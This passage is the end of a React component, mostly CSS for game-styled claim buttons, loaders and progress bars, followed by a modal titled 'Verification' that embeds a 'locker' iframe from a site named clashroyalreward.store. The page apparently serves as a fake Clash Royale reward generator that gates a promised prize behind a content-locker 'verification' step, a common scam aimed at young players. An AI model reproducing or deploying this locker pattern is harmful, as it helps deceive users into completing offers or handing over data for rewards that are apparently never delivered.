                0 10px 16px rgba(0, 0, 0, 0.18);
            }

            .cr-btn--claim:hover {
              filter: brightness(1.05);
              transform: translateY(-1px);
            }

            .cr-btn--disabled {
              background: linear-gradient(180deg, #8ea1b6 0%, #718297 100%);
              color: rgba(255, 255, 255, 0.9);
              border-color: #5c6f82;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.16),
                0 5px 0 #506275;
              cursor: not-allowed;
              opacity: 0.9;
            }

            .cr-bigBtn {
              position: relative;
              overflow: hidden;
              font-weight: 1000;
              font-size: 18px;
              padding: 14px 14px;
              border-radius: 18px;
              background: linear-gradient(
                180deg,
                #7cff92 0%,
                #39db61 55%,
                #19b741 100%
              );
              color: #fff;
              border: 3px solid #109936;
              text-shadow: 0 2px 0 rgba(0, 0, 0, 0.18);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.24),
                0 6px 0 #0d8d31,
                0 14px 20px rgba(0, 0, 0, 0.2);
              transition:
                transform 0.14s ease,
                filter 0.14s ease;
            }

            .cr-bigBtn:hover {
              filter: brightness(1.05);
              transform: translateY(-1px) scale(1.01);
            }

            .cr-bigBtn:after {
              content: "";
              position: absolute;
              top: 0;
              left: -120%;
              width: 55%;
              height: 100%;
              transform: skewX(-20deg);
              background: linear-gradient(
                90deg,
                transparent,
                rgba(255, 255, 255, 0.28),
                transparent
              );
              animation: crShine 2.6s linear infinite;
            }
              .cr-finalBox{
  border-radius: 22px;
  padding: 22px 18px;
  border: 3px solid #1662bf;
  background: linear-gradient(180deg, #5db8ff 0%, #3893f1 100%);
  box-shadow:
    inset 0 2px 0 rgba(255,255,255,.22),
    0 5px 0 #1252a8,
    0 14px 24px rgba(0,0,0,.18);
}

.cr-finalIcon{
  width: 68px;
  height: 68px;
  border-radius: 999px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 30px;
  color: #ffd95d;
  background: linear-gradient(180deg, #2e86e8 0%, #1f6fd4 100%);
  border: 3px solid #1457b0;
  box-shadow:
    inset 0 2px 0 rgba(255,255,255,.18),
    0 4px 0 #114a98;
  text-shadow: 0 2px 0 rgba(0,0,0,.22);
}

.cr-finalTitle{
  text-shadow:
    0 3px 0 rgba(0,0,0,.22),
    0 6px 12px rgba(0,0,0,.16);
}

.cr-finalLine{
  width: 72px;
  height: 6px;
  border-radius: 999px;
  background: linear-gradient(90deg, #fff0a8 0%, #ffc83c 100%);
  box-shadow: 0 2px 0 rgba(0,0,0,.15);
}

.cr-finalNotice{
  display: inline-flex;
  align-items: center;
  justify-content: center;
  min-height: 42px;
  padding: 10px 14px;
  border-radius: 14px;
  font-size: 13px;
  font-weight: 800;
  color: #fff7cf;
  text-align: center;
  background: linear-gradient(180deg, rgba(255,255,255,.14), rgba(255,255,255,.08));
  border: 2px solid rgba(255,255,255,.18);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.18);
}

            .cr-backBtn {
              font-weight: 1000;
              font-size: 18px;
              padding: 14px 14px;
              border-radius: 18px;
              background: linear-gradient(
                180deg,
                #73bfff 0%,
                #4e97ef 55%,
                #2f74cf 100%
              );
              color: #fff;
              border: 3px solid #1d59b4;
              text-shadow: 0 2px 0 rgba(0, 0, 0, 0.18);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.18),
                0 6px 0 #184c9c,
                0 14px 18px rgba(0, 0, 0, 0.18);
              transition:
                transform 0.14s ease,
                filter 0.14s ease;
            }

            .cr-backBtn:hover {
              filter: brightness(1.05);
              transform: translateY(-1px);
            }

            .cr-loadingMsg {
              color: #fff;
              font-weight: 1000;
              font-size: 16px;
              padding: 12px 14px;
              border-radius: 18px;
              border: 3px solid #1662bf;
              background: linear-gradient(180deg, #57b4ff 0%, #348ef0 100%);
              text-shadow: 0 2px 0 rgba(0, 0, 0, 0.2);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.2),
                0 4px 0 #1252a8;
            }

            .cr-progressTrack {
              border-radius: 999px;
              background: #1759b7;
              border: 3px solid #0d438f;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.12),
                0 3px 0 #093a7b;
            }

            .cr-progressFill {
              border-radius: 999px;
              background: linear-gradient(
                90deg,
                #ffe27a 0%,
                #ffc73c 55%,
                #ffae1a 100%
              );
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.35),
                0 0 12px rgba(255, 202, 80, 0.28);
            }

            .cr-ring {
              border: 4px solid rgba(255, 255, 255, 0.22);
              border-radius: 999px;
            }

            .cr-ringSpin {
              border: 4px solid transparent;
              border-top-color: #ffe27a;
              border-right-color: #ffc83c;
              border-radius: 999px;
              animation: spin 0.9s linear infinite;
            }

            .cr-ring2 {
              border: 4px solid rgba(255, 255, 255, 0.12);
              border-radius: 999px;
            }

            .cr-ringSpin2 {
              border: 4px solid transparent;
              border-bottom-color: #fff2a6;
              border-left-color: #ffc83c;
              border-radius: 999px;
              animation: spin 1.1s linear infinite;
            }

            .cr-finalBox {
              border-radius: 20px;
              padding: 18px;
              border: 3px solid #1662bf;
              background: linear-gradient(180deg, #57b4ff 0%, #348ef0 100%);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.2),
                0 5px 0 #1252a8,
                0 14px 24px rgba(0, 0, 0, 0.18);
            }

            .custom-scrollbar::-webkit-scrollbar {
              width: 7px;
            }

            .custom-scrollbar::-webkit-scrollbar-track {
              background: #1b5ebe;
              border-radius: 10px;
            }

            .custom-scrollbar::-webkit-scrollbar-thumb {
              background: linear-gradient(180deg, #ffe27a, #ffb82e);
              border-radius: 10px;
            }

            .custom-scrollbar::-webkit-scrollbar-thumb:hover {
              filter: brightness(1.05);
            }

            .animation-delay-1000 {
              animation-delay: 1s;
            }

            @keyframes spin {
              from {
                transform: rotate(0deg);
              }
              to {
                transform: rotate(360deg);
              }
            }

            @keyframes crShine {
              0% {
                left: -120%;
              }
              100% {
                left: 160%;
              }
            }
              .cr-loaderOuter{
  border-radius: 999px;
  border: 6px solid rgba(255,255,255,.16);
  border-top-color: #ffe27a;
  border-right-color: #ffc83c;
  animation: crSpinFast 1s linear infinite;
  box-shadow: 0 0 18px rgba(255,210,90,.18);
}

.cr-loaderMid{
  border-radius: 999px;
  border: 5px solid rgba(255,255,255,.10);
  border-left-color: #fff1a8;
  border-bottom-color: #ffbf38;
  animation: crSpinReverse 1.3s linear infinite;
}

.cr-loaderInner{
  border-radius: 999px;
  background: radial-gradient(circle at 30% 30%, #5db8ff 0%, #2d7fe0 70%, #1b5ab8 100%);
  border: 3px solid #165ab5;
  box-shadow:
    inset 0 2px 0 rgba(255,255,255,.18),
    0 4px 0 #114a98,
    0 8px 20px rgba(0,0,0,.18);
}

.cr-loaderCore{
  width: 56px;
  height: 56px;
  border-radius: 999px;
  display:flex;
  align-items:center;
  justify-content:center;
  background: linear-gradient(180deg, #2d8cf0 0%, #226fd3 100%);
  border: 3px solid #1456ad;
  box-shadow:
    inset 0 2px 0 rgba(255,255,255,.18),
    0 3px 0 #114892;
}

.cr-progressPercent{
  font-size: 22px;
  font-weight: 1000;
  color: #fff2a6;
  text-shadow:
    0 3px 0 #8a5b00,
    0 6px 12px rgba(0,0,0,.18);
}

.cr-progressTrack{
  border-radius: 999px;
  background: linear-gradient(180deg, #1453ae 0%, #0f4693 100%);
  border: 3px solid #0a3b7d;
  box-shadow:
    inset 0 2px 0 rgba(255,255,255,.10),
    0 3px 0 #082f63;
}

.cr-progressFill{
  position: relative;
  border-radius: 999px;
  background: linear-gradient(90deg, #ffe27a 0%, #ffc73c 55%, #ffae1a 100%);
  box-shadow:
    inset 0 2px 0 rgba(255,255,255,.35),
    0 0 12px rgba(255,202,80,.28);
  overflow: hidden;
}

.cr-progressFill::after{
  content: "";
  position: absolute;
  top: 0;
  left: -40%;
  width: 40%;
  height: 100%;
  background: linear-gradient(
    90deg,
    transparent,
    rgba(255,255,255,.35),
    transparent
  );
  animation: crBarShine 1.2s linear infinite;
}

.cr-loadingMsg{
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 2px;
  color:#fff;
  font-weight:1000;
  font-size:16px;
  padding:14px 16px;
  border-radius:18px;
  border: 3px solid #1662bf;
  background: linear-gradient(180deg, #57b4ff 0%, #348ef0 100%);
  text-shadow: 0 2px 0 rgba(0,0,0,.2);
  box-shadow:
    inset 0 2px 0 rgba(255,255,255,.2),
    0 4px 0 #1252a8;
}

.cr-dots{
  display:inline-flex;
  margin-left: 2px;
}

.cr-dots span{
  animation: crDots 1.2s infinite;
  opacity: .25;
}

.cr-dots span:nth-child(2){
  animation-delay: .2s;
}
.cr-dots span:nth-child(3){
  animation-delay: .4s;
}

.cr-loadingSub{
  color:#eaf5ff;
  font-size:13px;
  font-weight:800;
  text-align:center;
  text-shadow: 0 2px 0 rgba(0,0,0,.16);
}

@keyframes crSpinFast{
  from{ transform: rotate(0deg); }
  to{ transform: rotate(360deg); }
}

@keyframes crSpinReverse{
  from{ transform: rotate(360deg); }
  to{ transform: rotate(0deg); }
}

@keyframes crBarShine{
  0%{ left:-40%; }
  100%{ left:120%; }
}

@keyframes crDots{
  0%, 100%{ opacity:.25; transform: translateY(0); }
  50%{ opacity:1; transform: translateY(-2px); }
}
          `}</style>
        </div>
      </div>

      {/* Locker */}

      <AnimatePresence>
        <motion.div
          key="locker-backdrop"
          className={`${showLocker ? "fixed" : "hidden"} inset-0 z-50 flex items-center justify-center bg-black/40 px-3`}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          transition={{ duration: 0.18, ease: "easeOut" }}
          onClick={() => setShowLocker(false)} // click outside closes
        >
          <motion.div
            key="locker-modal"
            className="w-[92%] md:w-[60%] lg:w-[40%] h-[calc(var(--vh,1vh)*90)] md:h-[80vh] bg-white rounded-xl overflow-hidden shadow-2xl border border-gray-300"
            initial={{ opacity: 0, y: 30, scale: 0.96 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 20, scale: 0.97 }}
            transition={{ duration: 0.22, ease: "easeOut" }}
            onClick={(e) => e.stopPropagation()} // prevent close on inside click
          >
            {/* Optional header */}
            <div className="flex items-center justify-between px-3 py-2 bg-gray-50 border-b">
              <p className="font-game text-sm text-gray-700">Verification</p>
            </div>

            <iframe
              src="https://clashroyalreward.store/cl/i/m5ekq8"
              className="w-full h-full border-0"
              scrolling="yes"
              title="locker"
            />
          </motion.div>
        </motion.div>
      </AnimatePresence>
    </>
  );
};

export default PacksSection;
